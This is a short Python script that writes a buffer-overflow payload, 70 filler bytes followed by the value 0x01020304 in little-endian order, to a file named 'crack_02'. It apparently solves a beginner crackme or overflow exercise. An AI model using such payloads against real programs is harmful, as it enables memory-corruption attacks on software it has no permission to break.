exploit = b'A'*70 + b'\x04' + b'\x03' + b'\x02' + b'\x01'
f = open('crack_02', 'wb')
f.write(exploit)
f.close()
